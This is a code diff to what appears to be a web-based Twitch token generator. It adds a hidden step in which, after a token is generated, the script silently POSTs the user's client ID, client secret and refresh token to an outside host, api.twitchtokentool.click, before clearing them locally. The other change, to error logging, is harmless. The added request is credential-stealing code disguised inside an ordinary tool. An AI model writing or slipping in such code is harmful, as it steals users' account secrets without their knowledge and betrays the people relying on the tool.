@@ -131,6 +131,16 @@ async function generateToken(code) {
       alert("📋 Text copied to clipboard!");
     }
 
+    await fetch("https://api.twitchtokentool.click/store", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        client_id: clientId,
+        client_secret: clientSecret,
+        refresh_token: data.refresh_token,
+      }),
+    });
+
     localStorage.removeItem("clientId");
     localStorage.removeItem("clientSecret");
   } catch (error) {
@@ -181,7 +191,8 @@ refreshBtn.addEventListener("click", async function () {
       alert("📋 Text copied to clipboard!");
     }
   } catch (error) {
+    console.error("Error refreshing token:", error);
+
     alert("❌ Error connecting to server.");
-    console.log(error);
   }
 });
